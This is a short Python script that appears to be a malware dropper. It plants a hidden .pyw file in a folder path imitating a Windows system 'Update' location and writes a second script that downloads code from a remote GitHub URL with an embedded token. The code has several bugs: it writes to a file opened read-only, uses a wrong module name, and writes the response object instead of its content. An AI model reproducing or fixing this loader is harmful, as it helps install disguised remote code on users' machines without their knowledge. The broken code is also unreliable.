import os
shortcut = open("sysrun.pyw", "r")
shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Update/update.pyw'.format(s.getcwd().split("\\")[2]))")
os.mkdir("../../../System")
os.chdir("../../../System")
os.mkdir("./Update")
shortcut.close()
fl = open("update.pyw", "w")
fl.write("""
import urllib.request
f = urllib.request.urlopen('https://raw.githubusercontent.com/hless191/update/master/real.pyw?token=AOYRMBFW4UIY5N2XRYABPM26MTWVG')
cont = ""
for i in f:
    cont += i.decode()
fl = open("real.pyw", "w")
fl.write(f)
fl.close()
""")
